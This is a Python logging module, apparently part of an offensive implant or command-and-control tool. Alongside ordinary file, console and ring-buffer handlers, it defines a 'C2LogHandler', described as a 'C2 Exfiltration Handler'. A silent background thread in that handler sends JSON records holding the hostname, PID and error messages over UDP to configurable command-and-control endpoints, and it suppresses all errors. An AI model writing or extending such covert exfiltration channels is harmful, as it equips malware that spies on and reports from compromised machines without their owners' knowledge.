import logging
import os
import platform
import json
import threading
import time
import socket
import sys
from logging.handlers import RotatingFileHandler

class JSONFormatter(logging.Formatter):
    def format(self, record):
        # Safely get stage if provided
        stage = getattr(record, 'stage', None)
        data = {
            'timestamp': record.created,
            'level':     record.levelname,
            'stage':     stage,
            'message':   record.getMessage(),
            'module':    record.module,
            'funcName':  record.funcName,
            'line':      record.lineno,
            'pid':       os.getpid(),
            'hostname':  platform.node(),
            # use the built-in processName attribute
            'process_name': record.processName
        }
        return json.dumps(data)

class RingBufferHandler(logging.Handler):
    def __init__(self, capacity=1000):
        super().__init__()
        self.buffer = []
        self.lock = threading.Lock()
        self.capacity = capacity

    def emit(self, record):
        try:
            msg = self.format(record)
            with self.lock:
                if len(self.buffer) >= self.capacity:
                    self.buffer.pop(0)
                self.buffer.append(msg)
        except Exception:
            pass

    def get_buffer(self):
        with self.lock:
            return list(self.buffer)

class C2LogHandler(logging.Handler):
    def __init__(self, endpoints=None, timeout=2.0):
        super().__init__()
        self.endpoints = endpoints or []
        self.timeout = timeout
        self.queue = []
        self.lock = threading.Lock()
        self.thread = threading.Thread(target=self._worker, daemon=True)
        self.thread.start()

    def emit(self, record):
        try:
            msg = self.format(record)
            with self.lock:
                self.queue.append(msg)
        except Exception:
            pass

    def _worker(self):
        while True:
            try:
                if not self.queue:
                    time.sleep(0.5)
                    continue
                with self.lock:
                    msg = self.queue.pop(0)
                for ep in self.endpoints:
                    self._send_udp(ep, msg)
            except Exception:
                time.sleep(1)

    def _send_udp(self, endpoint, message):
        try:
            host, port_str = endpoint.split(':')
            port = int(port_str)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(message.encode('utf-8'), (host, port))
            sock.close()
        except Exception:
            pass

def setup_logging(log_file, verbose=False, c2_endpoints=None):
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)

    # 1) Rotating File Handler (JSON)
    file_handler = RotatingFileHandler(
        filename=log_file,
        maxBytes=10*1024*1024,
        backupCount=5,
        encoding='utf-8'
    )
    file_handler.setFormatter(JSONFormatter())
    logger.addHandler(file_handler)

    # 2) Console Handler (verbose)
    if verbose:
        console = logging.StreamHandler(sys.stdout)
        console.setLevel(logging.DEBUG)
        console.setFormatter(logging.Formatter(
            "%(asctime)s [%(levelname)s] %(message)s"
        ))
        logger.addHandler(console)

    # 3) In-Memory Ring Buffer
    ring_handler = RingBufferHandler(capacity=2000)
    ring_handler.setLevel(logging.INFO)
    ring_handler.setFormatter(JSONFormatter())
    logger.addHandler(ring_handler)

    # 4) C2 Exfiltration Handler
    c2_handler = C2LogHandler(endpoints=c2_endpoints)
    c2_handler.setLevel(logging.ERROR)
    c2_handler.setFormatter(JSONFormatter())
    logger.addHandler(c2_handler)

    logger.debug(f"Logging configured. File: {log_file}, verbose: {verbose}")
